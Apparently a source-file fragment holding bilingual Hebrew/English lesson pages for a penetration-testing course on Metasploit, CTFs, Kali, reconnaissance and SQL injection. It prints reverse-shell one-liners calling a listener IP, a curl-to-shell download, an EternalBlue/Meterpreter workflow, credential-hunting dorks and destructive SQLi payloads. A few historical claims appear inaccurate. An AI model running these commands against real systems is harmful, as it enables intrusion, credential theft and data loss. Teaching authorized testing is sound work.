+`<div class="did-you-know">💡 <strong>ידעת?</strong> Metasploit Framework נוצר ב-2003 ב-Perl על ידי HD Moore, עבר לRuby ב-2007, ונרכש על ידי Rapid7 ב-2009. כיום מכיל 2,100+ exploits, 592 payloads, ו-350+ auxiliary modules. EternalBlue (MS17-010) — הexploit שהפיץ WannaCry — זמין ב-Metasploit. זה גם אומר שכל sysadmin יכול לבדוק אם הרשת שלו פגיעה.</div>
+
+<div class="section-title">Metasploit Architecture</div>
+<p class="prose">Metasploit Framework מורכב מכמה סוגי modules: Exploits (קוד שמנצל פגיעות), Payloads (מה שרץ אחרי הפריצה — reverse shell, Meterpreter), Auxiliary (scanning, fuzzing, brute force ללא exploitation), Post (actions אחרי גישה), ו-Encoders (לhide payloads מAV). הכל נגיש דרך msfconsole — ה-CLI מרכזי.</p>
+<pre class="code-block"><code><span class="comment"># msfconsole basics</span>
+msfconsole -q              <span class="comment"># פתח בלי banner</span>
+help                       <span class="comment"># רשימת פקודות</span>
+search eternalblue         <span class="comment"># חפש exploit</span>
+use exploit/windows/smb/ms17_010_eternalblue
+info                       <span class="comment"># מידע מלא על module</span>
+show options               <span class="comment"># אילו params צריך</span>
+set RHOSTS 192.168.1.100  <span class="comment"># target IP</span>
+set LHOST 192.168.1.50    <span class="comment"># attacker IP (our machine)</span>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run                        <span class="comment"># הרץ</span></code></pre>
+
+<div class="section-title">Meterpreter — Advanced Payload</div>
+<p class="prose">Meterpreter הוא payload מתקדם שרץ בזיכרון — לא נכתב לדיסק, קשה יותר לאנטי-וירוס לזהות. הוא מספק שורה של יכולות ישירות: filesystem access, process injection, privilege escalation, network pivoting. כשyouיש Meterpreter session — יש שליטה מלאה על ה-machine.</p>
+<pre class="code-block"><code><span class="comment"># Meterpreter commands</span>
+sysinfo             <span class="comment"># OS, computer name, domain</span>
+getuid              <span class="comment"># מי אנחנו? (user, SYSTEM)</span>
+ps                  <span class="comment"># רשימת processes</span>
+migrate PID         <span class="comment"># inject לprocess אחר</span>
+getsystem           <span class="comment"># נסה privilege escalation</span>
+
+<span class="comment"># Filesystem</span>
+ls / dir            <span class="comment"># list files</span>
+cd C:\\Users\\Admin\\Desktop
+download secret.txt ./   <span class="comment"># הורד קובץ</span>
+upload backdoor.exe C:\\  <span class="comment"># העלה קובץ</span>
+
+<span class="comment"># Pivoting</span>
+ipconfig / ifconfig  <span class="comment"># רשתות זמינות</span>
+route add 10.10.10.0/24 SessionID  <span class="comment"># route דרך session</span>
+
+<span class="comment"># Post modules</span>
+run post/windows/gather/credentials/credential_collector
+run post/multi/manage/shell_to_meterpreter</code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 EternalBlue — NSA exploit שפורסם לעולם</div>
+  <div class="real-world-body">
+    EternalBlue (MS17-010) היה exploit של ה-NSA ל-SMB vulnerability ב-Windows. ב-2017 קבוצת Shadow Brokers גנבה ופרסמה אוסף של NSA exploits. חודש אחר כך: WannaCry ransomware ו-NotPetya השתמשו ב-EternalBlue לפשוט על רשתות שלמות בautoworm propagation.<br><br>
+    Metasploit הוסיף את EternalBlue כmodule. מאז: כל pentester בודק לפיו. גם כל attacker. Patch היה זמין מחודש לפני WannaCry — אבל NHS, FedEx, Renault — לא עדכנו. Patch management הוא prevention, לא nice-to-have.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 בפועל</strong></div>
+
+<p class="prose">Metasploit הכי שימושי כשמשתמשים בו בצורה מסודרת: workspace לכל engagement, import של nmap scans, ו-documentation של כל session.</p>
+
+<div class="section-title">Workspace Setup</div>
+<pre class="code-block"><code><span class="comment"># צור workspace לengagement</span>
+msfconsole -q
+workspace -a client_2025_01
+workspace   <span class="comment"># רשימת workspaces</span>
+
+<span class="comment"># Import nmap XML scan</span>
+db_import scans/initial_scan.xml
+hosts       <span class="comment"># רשימת hosts שנמצאו</span>
+services    <span class="comment"># רשימת services</span>
+
+<span class="comment"># חיפוש exploits לפי service</span>
+search type:exploit name:smb
+search cve:2021-44228   <span class="comment"># Log4Shell</span>
+search platform:windows type:exploit rank:excellent</code></pre>
+
+<div class="section-title">Exploit Workflow</div>
+<pre class="code-block"><code><span class="comment"># דוגמה: EternalBlue (MS17-010)</span>
+use exploit/windows/smb/ms17_010_eternalblue
+show options        <span class="comment"># מה צריך להגדיר</span>
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50   <span class="comment"># הIP שלך — חשוב!</span>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+check   <span class="comment"># האם target vulnerable? (לא תמיד עובד)</span>
+run
+
+<span class="comment"># אחרי Meterpreter session:</span>
+sysinfo        <span class="comment"># מה ה-machine?</span>
+getuid         <span class="comment"># מי אנחנו?</span>
+getsystem      <span class="comment"># נסה privilege escalation</span>
+run post/multi/recon/local_exploit_suggester  <span class="comment"># privesc suggestions</span>
+
+<span class="comment"># PoC screenshot לreport</span>
+screenshot     <span class="comment"># שמור screenshot של desktop</span>
+
+<span class="comment"># תיעוד session</span>
+sessions -l    <span class="comment"># רשימת sessions</span>
+sessions -i 1  <span class="comment"># חזור לsession</span></code></pre>
+
+<div class="callout callout-warn"><strong>⚠️ חשוב:</strong> תמיד note לפני exploitation: timestamp, target IP, exploit שימשת, ומה קרה. אם משהו משתבש — ה-log הוא מה שמגן עליך ומאפשר לclient לעשות rollback.</div>`,
+`<div class="did-you-know">💡 <strong>ידעת?</strong> HackTheBox מכיל מעל 500 machines להack. כל machine מכילה user.txt ו-root.txt — flags שמוכיחות שהגעת לgacess. המשתמשים הטובים ביותר מrank ב-"Pro Hacker" ו-"Elite Hacker". Companies כמו Google, Microsoft, ו-Apple מגייסות מHackTheBox leaderboard. זו literally the career path.</div>
+
+<div class="section-title">מה זה CTF ולמה לשחק?</div>
+<p class="prose">CTF (Capture The Flag) הוא תחרות שבה משתתפים פותרים challenges בתחומי security: web exploitation, binary exploitation, cryptography, forensics, ו-reverse engineering. כל challenge מסתיים ב-flag — מחרוזת בפורמט CTF{...}. CTFs הם הדרך הלגיטימית והמהנה ביותר לתרגל pentesting skills — כי המערכות מיועדות לhacking.</p>
+<p class="prose">ההבדל בין CTF ל-real pentesting: CTF הוא environment מבוקר שמיועד להיות פרוץ. Real pentest הוא assessment של מערכות production עם scope מוגדר. אבל ה-skills זהים — וCTF נותן מקום ללמוד בלי לדאוג לlegal implications.</p>
+
+<div class="section-title">Platforms לתרגול</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>Platform</th><th>סוג</th><th>קושי</th><th>חינמי?</th></tr></thead><tbody>
+<tr><td><strong>HackTheBox</strong></td><td>Machines + Challenges</td><td>Medium-Hard</td><td>חלקי</td></tr>
+<tr><td><strong>TryHackMe</strong></td><td>Guided rooms, learning paths</td><td>Beginner-Medium</td><td>חלקי</td></tr>
+<tr><td><strong>VulnHub</strong></td><td>VM downloads</td><td>All levels</td><td>✅ חינמי</td></tr>
+<tr><td><strong>PicoCTF</strong></td><td>Educational CTF</td><td>Beginner</td><td>✅ חינמי</td></tr>
+<tr><td><strong>CTFtime.org</strong></td><td>CTF calendar</td><td>All levels</td><td>✅ חינמי</td></tr>
+</tbody></table></div>
+
+<div class="section-title">CTF Methodology — כיצד מתקרבים</div>
+<p class="prose">אין "שיטה נכונה" אחת לCTF, אבל יש framework שעוזר. כל challenge מתחיל עם reconnaissance: מה יש? מה גלוי? מה הtechnology stack? רק אחרי שמבינים את ה-surface area — מתחילים לנסות vectors.</p>
+<pre class="code-block"><code><span class="comment"># Web Challenge checklist</span>
+1. Source code (Ctrl+U) — comments? hidden fields?
+2. robots.txt, sitemap.xml — hidden paths?
+3. /admin, /backup, /.git — common directories
+4. Cookies — JWT? base64? manipulable?
+5. Parameters — SQLi, XSS, IDOR, SSRF?
+6. Headers — Server version? X-Powered-By?
+
+<span class="comment"># Reverse shell one-liner (lab only!)</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+
+<span class="comment"># Netcat listener</span>
+nc -lvnp 4444   <span class="comment"># ← ממתין לconnection</span>
+
+<span class="comment"># Stabilize shell</span>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+<span class="comment"># Ctrl+Z → stty raw -echo; fg → Enter</span></code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 From CTF to Career — ה-Path האמיתי</div>
+  <div class="real-world-body">
+    Marcus Hutchins (@MalwareTechBlog) — האדם שעצר את WannaCry ב-2017 על ידי רשום typosquatting domain — התחיל מCTFs ב-teenage years. בגיל 22 הוא זיהה killswitch ב-WannaCry ב-15 דקות.<br><br>
+    ה-path הסטנדרטי: CTF beginner (picoCTF, TryHackMe) ← CTF intermediate (HackTheBox Easy) ← OSCP certification ← Junior Penetration Tester. Junior Pentester salary ב-Israel: ₪15,000-25,000/month. Senior: ₪30,000-50,000+. Demand גבוה, supply נמוך.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 בפועל</strong></div>
+
+<p class="prose">הדרך הכי מהירה להתחיל: TryHackMe מס' 1 ל-beginners, HackTheBox מס' 1 ל-intermediate. שניהם מספקים guided labs שמלמדים tools אמיתיים על machines אמיתיות.</p>
+
+<div class="section-title">HackTheBox — First Machine</div>
+<pre class="code-block"><code><span class="comment"># 1. הורד .ovpn ←connect</span>
+sudo openvpn ~/Downloads/lab_username.ovpn
+
+<span class="comment"># 2. בדוק שמחובר</span>
+ping 10.10.10.1   <span class="comment"># HTB network</span>
+
+<span class="comment"># 3. בחר machine easy/retired</span>
+<span class="comment"># Retired machines יש writeups — מצוין ללמידה</span>
+
+<span class="comment"># 4. Initial Recon תמיד</span>
+sudo nmap -sV -sC -oA scans/machine_name TARGET_IP
+cat scans/machine_name.nmap | grep "open"
+
+<span class="comment"># 5. Web? גלוש לhttp://TARGET_IP</span>
+<span class="comment"># gobuster, nikto, whatweb</span>
+
+<span class="comment"># 6. SSH/FTP open? נסה anonymous</span>
+ssh root@TARGET_IP   <span class="comment"># refuse = port open</span>
+ftp TARGET_IP        <span class="comment"># anonymous login?</span></code></pre>
+
+<div class="section-title">Reverse Shell — חיוני לCTF</div>
+<pre class="code-block"><code><span class="comment"># Listener שלך (Kali machine)</span>
+nc -lvnp 4444
+
+<span class="comment"># Payloads לשלוח ל-target (בחר לפי OS + שפה):</span>
+<span class="comment"># Bash</span>
+bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1
+
+<span class="comment"># Python3</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+
+<span class="comment"># revshells.com ← generator לכל שפה</span>
+
+<span class="comment"># שפר shell אחרי קבלה:</span>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+<span class="comment"># Ctrl+Z → stty raw -echo → fg → Enter</span></code></pre>
+
+<div class="section-title">Privilege Escalation — Quick Wins</div>
+<pre class="code-block"><code><span class="comment"># תמיד מריצים קודם:</span>
+sudo -l           <span class="comment"># מה מותר בלי סיסמה?</span>
+find / -perm -4000 -type f 2>/dev/null  <span class="comment"># SUID files</span>
+cat /etc/crontab  <span class="comment"># cron jobs</span>
+
+<span class="comment"># LinPEAS — הכי מקיף</span>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+<span class="comment"># GTFOBins — exploit SUID/sudo</span>
+<span class="comment"># https://gtfobins.github.io</span>
+<span class="comment"># חפש שם הbinary שמצאת — מציג exactly how to exploit</span></code></pre>
+
+<div class="callout callout-tip"><strong>💡 Stuck?</strong> לפני שמסתכלים ב-writeup — נסה 30 דקות נוספות בכיוון חדש. CTF skills נבנים מfrustation. אחרי שרואים writeup — חשוב לשחזר בעצמך על אותה machine, לא רק לקרוא.</div>`
+  ],
+  cheat:[
+`<div class="callout callout-success"><strong>📋 Kali Linux — סביבת העבודה</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Debian</span></div><div class="cheat-item"><span class="cheat-key">pentesting בלבד</span></div><div class="cheat-item"><span class="cheat-key">14M+ סיסמאות</span></div><div class="cheat-item"><span class="cheat-key">Metasploit database</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 Reconnaissance — מיפוי יעד</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Passive=לא שולח packets</span></div><div class="cheat-item"><span class="cheat-key">specific domain</span></div><div class="cheat-item"><span class="cheat-key">internet-connected devices</span></div><div class="cheat-item"><span class="cheat-key">כל 65535 ports</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 SQL Injection — כיצד ולמה</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">input לא sanitized בquery</span></div><div class="cheat-item"><span class="cheat-key">query להחזיר כל הרשומות</span></div><div class="cheat-item"><span class="cheat-key">מפריד SQL מdata</span></div><div class="cheat-item"><span class="cheat-key">SLEEP()</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 XSS — Cross-Site Scripting</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">לא צריך ש-victim ילחץ link</span></div><div class="cheat-item"><span class="cheat-key">server לא רואה payload</span></div><div class="cheat-item"><span class="cheat-key">Content Security Policy</span></div><div class="cheat-item"><span class="cheat-key">session cookies</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 Burp Suite — Web Testing</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">8080</span></div><div class="cheat-item"><span class="cheat-key">שלח request ידנית וחזרה</span></div><div class="cheat-item"><span class="cheat-key">automated fuzzing/brute force</span></div><div class="cheat-item"><span class="cheat-key">Insecure Direct Object Reference</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 Password Attacks — שבירת סיסמאות</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">מכוון להיות איטי</span></div><div class="cheat-item"><span class="cheat-key">MD5</span></div><div class="cheat-item"><span class="cheat-key">variations על wordlist words</span></div><div class="cheat-item"><span class="cheat-key">leaked username:password pairs</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 Metasploit — Exploitation Framework</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">2003</span></div><div class="cheat-item"><span class="cheat-key">בזיכרון בלבד</span></div><div class="cheat-item"><span class="cheat-key">target IP</span></div><div class="cheat-item"><span class="cheat-key">attacker listening IP</span></div></div></div>`,
+`<div class="callout callout-success"><strong>📋 CTF — תרגול ולמידה</strong></div><div class="cheat-grid"><div class="cheat-card"><div class="cheat-item"><span class="cheat-key">Capture The Flag</span></div><div class="cheat-item"><span class="cheat-key">machines ל-hack עם flags</span></div><div class="cheat-item"><span class="cheat-key">beginners-intermediate עם guided rooms</span></div><div class="cheat-item"><span class="cheat-key">flag{...} / CTF{...}</span></div></div></div>`
+  ]
+},
+en:{
+  dir:'ltr',lang:'en',langBtn:'🇮🇱 HE',sbLabel:'Chapters',
+  names:["Kali Linux — The Environment", "Reconnaissance — Target Mapping", "SQL Injection — How and Why", "XSS — Cross-Site Scripting", "Burp Suite — Web Testing", "Password Attacks — Cracking Passwords", "Metasploit — Exploitation Framework", "CTF — Practice & Learning"],
+  tags:["// Chapter 00", "// Chapter 01", "// Chapter 02", "// Chapter 03", "// Chapter 04", "// Chapter 05", "// Chapter 06", "// Chapter 07"],
+  descs:["Kali tools, setup, what's included and why, VirtualBox/VM, pre-install steps", "OSINT, Nmap, subdomain enumeration, Shodan, passive vs active recon", "Manual SQLi, sqlmap, blind SQLi, union-based, error-based, time-based", "Reflected, Stored, DOM XSS, Cookie theft, CSP, XSS bypass techniques", "Proxy, Repeater, Intruder, Scanner, intercept, request manipulation", "Hashing, rainbow tables, hashcat, hydra, credential stuffing", "msfconsole, modules, Meterpreter, payloads, post-exploitation", "CTF categories, HackTheBox, TryHackMe, methodology, legal practice environments"],
+  tabs:['📖 Learn','🎮 Game','📋 Summary'],
+  tabKeys:['learn','game','cheat'],
+  gameTitle:'QUIZ',gameDesc:'Answer fast. Every correct answer = +10 points.',
+  gameStart:'▶ Start',gameSeconds:'seconds',gameQuestions:'questions',gameXP:'+10 XP',
+  gameAgain:'🔄 Again',gameToCheat:'📋 Summary →',
+  quizPrev:'← Prev',quizNext:'Next →',quizSubmit:'Submit ✓',
+  quizExplain:'💡 Explanation:',quizToLab:'',quizAgain:'🔄 Again',
+  resultLabels:['Try again!','Almost...','Good!','Well done!','Excellent!','Perfect! 🎯'],
+  lbTitle:'// Leaderboard',labExplain:'💡 Explanation:',
+  points:'pts',of:'of',question:'Question',
+  optLetters:['A','B','C','D'],playerName:'You',unknownPlayer:'Player',pct:'% correct',
+  learn:[
+`<div class="did-you-know">💡 <strong>Did you know?</strong> Kali Linux ships with 600+ penetration testing tools — pre-configured, updated, and maintained. What takes hours to set up on Ubuntu (Nmap, Metasploit, Burp Suite, Wireshark) — Kali delivers in one ISO. Offensive Security (the company that develops Kali) also manages OSCP — one of the most prestigious certifications in penetration testing.</div>
+
+<div class="section-title">What is Kali and Why Debian-based?</div>
+<p class="prose">Kali Linux is a distribution based on Debian, designed exclusively for penetration testing, digital forensics, and red team operations. It is not designed for everyday use — and does not need to be installed as your main OS. The correct approach: a VM (VirtualBox, VMware) that lets you disconnect, backup, and take snapshots before each engagement.</p>
+<p class="prose">The advantage of Kali over regular Ubuntu: every tool comes pre-configured for pentesting. Metasploit is set up. PostgreSQL for msfdb. Burp Suite CA installed. Wordlists at /usr/share/wordlists. This saves hours of setup at the start of every engagement.</p>
+
+<div class="section-title">Core Tools</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>Category</th><th>Tools</th><th>Use</th></tr></thead><tbody>
+<tr><td>Reconnaissance</td><td>Nmap, theHarvester, Maltego, Amass</td><td>Target mapping</td></tr>
+<tr><td>Web Testing</td><td>Burp Suite, OWASP ZAP, sqlmap, nikto</td><td>Web vulnerabilities</td></tr>
+<tr><td>Exploitation</td><td>Metasploit, searchsploit</td><td>Exploit known CVEs</td></tr>
+<tr><td>Password</td><td>hashcat, john, hydra, medusa</td><td>Crack hashes, brute force</td></tr>
+<tr><td>Wireless</td><td>aircrack-ng, reaver, wifite</td><td>WiFi assessment</td></tr>
+<tr><td>Forensics</td><td>Autopsy, Volatility, binwalk</td><td>Digital forensics</td></tr>
+</tbody></table></div>
+
+<div class="section-title">VM Setup — The Right Way</div>
+<pre class="code-block"><code><span class="comment"># VirtualBox settings for Kali</span>
+RAM: 4GB minimum (8GB recommended for Metasploit)
+Storage: 40GB+ (tools and captures take space)
+Network: NAT (for internet) + Host-Only (for lab)
+Display: 128MB VRAM, Enable 3D
+
+<span class="comment"># After installation — initial update</span>
+sudo apt update && sudo apt full-upgrade -y
+sudo apt install -y kali-linux-large  <span class="comment"># full toolset</span>
+
+<span class="comment"># msfdb init — Metasploit database</span>
+sudo msfdb init
+msfconsole -q -x "db_status"
+<span class="comment"># [*] Connected to msf. Connection type: postgresql</span>
+
+<span class="comment"># Wordlists — essential for pentesting</span>
+ls /usr/share/wordlists/
+gunzip /usr/share/wordlists/rockyou.txt.gz  <span class="comment"># 14M passwords</span></code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Kali in the Cloud — Pentesting Without a Heavy Laptop</div>
+  <div class="real-world-body">
+    Offensive Security offers Kali Cloud images for AWS, Azure, and GCP. Pentesters run Kali on EC2 t3.medium (2 vCPU, 4GB RAM, $0.04/hr) close to the target — reducing scanning latency and hiding the real IP. Kali nethunter (Android) enables pentesting from a mobile device. Kali WSL (Windows Subsystem for Linux) for development on Windows with full tools.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>
+
+<p class="prose">Before every engagement, the environment needs to be properly configured. An organized working method saves hours of debugging and ensures findings are documented correctly.</p>
+
+<div class="section-title">Workspace Structure</div>
+<pre class="code-block"><code><span class="comment"># Create an organized engagement directory</span>
+mkdir -p ~/engagements/client_2025_01/{recon,scans,exploits,loot,reports}
+cd ~/engagements/client_2025_01
+
+<span class="comment"># Documentation — every command and result</span>
+script -a logs/session_$(date +%Y%m%d_%H%M).log
+<span class="comment"># everything is now logged automatically</span>
+
+<span class="comment"># VPN connection for engagement (usually required)</span>
+sudo openvpn --config client.ovpn --daemon
+ip addr show tun0   <span class="comment"># verify connected</span>
+
+<span class="comment"># Update tools before engagement</span>
+sudo apt update && sudo apt upgrade -y
+msfdb reinit   <span class="comment"># Metasploit DB</span></code></pre>
+
+<div class="section-title">Tmux — Organized Terminal Work</div>
+<pre class="code-block"><code><span class="comment"># Tmux setup — multiple panes together</span>
+tmux new -s pentest
+
+<span class="comment"># Split windows:</span>
+Ctrl+B %     <span class="comment"># split vertical</span>
+Ctrl+B "     <span class="comment"># split horizontal</span>
+Ctrl+B arrows  <span class="comment"># navigate</span>
+
+<span class="comment"># Typical layout:</span>
+<span class="comment"># Pane 1: nmap / recon</span>
+<span class="comment"># Pane 2: Metasploit</span>
+<span class="comment"># Pane 3: notes / testing</span>
+<span class="comment"># Pane 4: netcat listeners</span>
+
+<span class="comment"># Resume session after disconnect:</span>
+tmux attach -t pentest</code></pre>
+
+<div class="section-title">Checklist Before Every Engagement</div>
+<p class="prose">Always verify before starting: signed scope document, authorized IP ranges, client emergency contact, and clear rules of engagement (when you are allowed to operate, what is off-limits).</p>
+<pre class="code-block"><code><span class="comment"># Verify you are operating within scope</span>
+cat scope.txt                    <span class="comment"># authorized IPs</span>
+ping -c1 target_ip              <span class="comment"># target responding?</span>
+whois target_ip | grep OrgName  <span class="comment"># verify this is the client</span></code></pre>`,
+`<div class="did-you-know">💡 <strong>Did you know?</strong> 90% of the information a red teamer needs about an organization is available on Google, LinkedIn, GitHub, and Shodan — before touching a single server. "Google Dorking" — advanced search queries — frequently exposes config files with passwords, open admin panels, and old backup files that nobody knew were public.</div>
+
+<div class="section-title">Passive vs Active Reconnaissance</div>
+<p class="prose">Passive recon collects information from public sources without sending a single packet to the target. Active recon sends packets directly to the target. The difference is critical: passive cannot be detected, active can trigger IDS/firewall alerts. Most engagements begin with passive to learn as much as possible before touching the target.</p>
+
+<div class="section-title">Google Dorking</div>
+<pre class="code-block"><code><span class="comment"># Google Dorks — find sensitive information</span>
+site:company.com filetype:pdf              <span class="comment"># all PDFs</span>
+site:company.com inurl:admin               <span class="comment"># admin panels</span>
+site:company.com ext:env OR ext:cfg        <span class="comment"># config files</span>
+"company.com" "DB_PASSWORD"               <span class="comment"># database passwords</span>
+intitle:"index of" site:company.com       <span class="comment"># directory listings</span>
+site:github.com "company.com" password    <span class="comment"># secrets on GitHub</span>
+
+<span class="comment"># Shodan — search engine for internet devices</span>
+<span class="comment"># shodan.io — search:</span>
+org:"Company Name"       <span class="comment"># all company servers</span>
+hostname:company.com     <span class="comment"># by hostname</span>
+"default password"       <span class="comment"># devices with default credentials!</span>
+port:3306 country:IL     <span class="comment"># MySQL exposed in Israel</span></code></pre>
+
+<div class="section-title">Nmap — Port Scanning</div>
+<p class="prose">Nmap is the standard port scanning tool. It sends various packets to ports and analyzes responses. Important: against targets without authorization — this is legally different in every country. Always in a lab environment under your control or with written permission.</p>
+<pre class="code-block"><code><span class="comment"># Nmap scan types</span>
+nmap -sn 192.168.1.0/24          <span class="comment"># ping scan — who is alive?</span>
+nmap -sV -sC 192.168.1.100       <span class="comment"># version + default scripts</span>
+nmap -p- 192.168.1.100           <span class="comment"># all 65535 ports</span>
+nmap -O 192.168.1.100            <span class="comment"># OS detection</span>
+nmap -A 192.168.1.100            <span class="comment"># aggressive: all of above</span>
+nmap -sS 192.168.1.100           <span class="comment"># SYN scan (stealth)</span>
+
+<span class="comment"># Save results</span>
+nmap -sV 192.168.1.0/24 -oA scan_output
+<span class="comment"># Creates: scan_output.nmap, .gnmap, .xml</span>
+
+<span class="comment"># DNS + Subdomain Enum</span>
+subfinder -d company.com -o subs.txt
+amass enum -passive -d company.com</code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 OSINT Case: GitHub Secrets Leak</div>
+  <div class="real-world-body">
+    A classic scenario that happens at almost every company: a developer pushed an env file to GitHub. Search: <code>site:github.com "company.com" "API_KEY"</code>. Result: an old repository the dev thought was private — but was briefly public before being made private. Google had already indexed it.<br><br>
+    Tools like truffleHog and gitleaks scan repos for passwords. When found — attackers run them live, steal AWS keys, S3 buckets, and production databases. The fix: git history cannot be deleted — you must rotate credentials, not just delete the commit.
+  </div>
+</div>
+
+<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>
+
+<p class="prose">Good recon equals a successful engagement. Every hour invested here saves three hours of wrong exploitation. Here is the standard recon workflow.</p>
+
+<div class="section-title">Recon Step 1 — Passive (zero contact with target)</div>
+<pre class="code-block"><code><span class="comment"># Subdomain discovery</span>
+subfinder -d target.com -o recon/subdomains.txt
+amass enum -passive -d target.com >> recon/subdomains.txt
+sort -u recon/subdomains.txt -o recon/subdomains.txt
+wc -l recon/subdomains.txt   <span class="comment"># how many found?</span>
+
+<span class="comment"># Who is alive? (HTTP probe)</span>
+cat recon/subdomains.txt | httprobe > recon/live_hosts.txt
+
+<span class="comment"># Screenshots of every live site</span>
+gowitness file -f recon/live_hosts.txt -d recon/screenshots/
+gowitness report serve   <span class="comment"># opens visual gallery</span></code></pre>
+
+<div class="section-title">Recon Step 2 — Active Scanning</div>
+<pre class="code-block"><code><span class="comment"># Nmap — save everything</span>
+sudo nmap -sV -sC -oA scans/initial_scan target.com
+<span class="comment"># .nmap = human readable</span>
+<span class="comment"># .xml = for import into Metasploit</span>
+<span class="comment"># .gnmap = for grep</span>
+
+<span class="comment"># Web tech fingerprinting</span>
+whatweb https://target.com -v
+<span class="comment"># WordPress 6.1, Apache 2.4.52, PHP 8.1 ← attack surface</span>
+
+<span class="comment"># Directory discovery</span>
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/dirs.txt -x php,html,txt,bak
+
+<span class="comment"># GitHub secrets search</span>
+trufflehog github --org=targetorg --json > recon/github_secrets.json</code></pre>
+
+<div class="callout callout-tip"><strong>💡 Golden rule:</strong> Document everything in real time. When you find something interesting — timestamp + what you found + the command you ran. Reports are written at the end from logs, not from memory.</div>`,
+`<div class="did-you-know">💡 <strong>Did you know?</strong> SQL Injection was discovered in 1998 and still ranks in the OWASP Top 3 in 2025. In 2024 alone, SQLi caused breaches at Microsoft, Oracle, and dozens of SaaS startups. Why does it not disappear? Because developers still write string concatenation in SQL queries. Takes 5 seconds to write wrong, years to detect.</div>
+
+<div class="section-title">How SQLi Works — The Basics</div>
+<p class="prose">SQL Injection occurs when an application builds a SQL query by concatenating user input directly — without sanitization. The query "escapes" the original intent and executes the attacker's code. This is not a sophisticated exploit — it is misusing dynamic SQL exactly as it was designed to work.</p>
+<pre class="code-block"><code><span class="comment"># Vulnerable code</span>
+query = "SELECT * FROM users WHERE name='" + user_input + "'"
+
+<span class="comment"># Input: ' OR '1'='1</span>
+<span class="comment"># Query becomes:</span>
+SELECT * FROM users WHERE name='' OR '1'='1'
+<span class="comment"># returns all users!</span>
+
+<span class="comment"># Input: '; DROP TABLE users; --</span>
+SELECT * FROM users WHERE name=''; DROP TABLE users; --'
+<span class="comment"># deletes the table!</span>
+
+<span class="comment"># Safe code</span>
+cursor.execute("SELECT * FROM users WHERE name=?", (user_input,))</code></pre>
+
+<div class="section-title">Types of SQLi</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">👁️</div><div class="card-title">Union-Based</div><div class="card-body">Appends UNION SELECT to the original query and returns data in the response. Need to know how many columns are in the original query. Most direct — if errors are not hidden.</div></div>
+<div class="card"><div class="card-icon">❌</div><div class="card-title">Error-Based</div><div class="card-body">Triggers SQL errors that contain information. extractvalue() and updatexml() in MySQL return data inside error messages. Works when errors are shown to the user.</div></div>
+<div class="card"><div class="card-icon">🦯</div><div class="card-title">Blind Boolean</div><div class="card-body">"Does the admin password start with 'a'?" — sends query, response differs for true/false. Slow but works even when errors are hidden.</div></div>
+<div class="card"><div class="card-icon">⏱️</div><div class="card-title">Time-Based Blind</div><div class="card-body">SLEEP(5) if true — if the response is delayed 5 seconds, the condition is correct. Slowest — works even when response is identical in all cases.</div></div>
+</div>
+
+<div class="section-title">sqlmap — Automation (on authorized targets only!)</div>
+<pre class="code-block"><code><span class="comment"># sqlmap — automated SQLi detection and exploitation</span>
+<span class="comment"># ONLY on authorized targets!</span>
+
+sqlmap -u "http://target.com/user?id=1" --dbs       <span class="comment"># list databases</span>
+sqlmap -u "http://target.com/user?id=1"        -D webapp --tables                            <span class="comment"># list tables</span>
+sqlmap -u "http://target.com/user?id=1"        -D webapp -T users --dump                    <span class="comment"># dump table</span>
+
+<span class="comment"># With cookies (authenticated)</span>
+sqlmap -u "http://target.com/profile?id=5"        --cookie="session=abc123" --level=3</code></pre>
+
+<div class="real-world-box">
+  <div class="real-world-title">🌍 Equifax 2017 — 147M Records, SQL Injection</div>
+  <div class="real-world-body">
+    The Equifax breach (2017) that exposed credit data of 147 million Americans was a combination of SQLi in a web portal and a missing patch for Apache Struts. The attacker used CVE-2017-5638 (RCE in Struts) to get in, then SQLi to exfiltrate the database.<br><br>
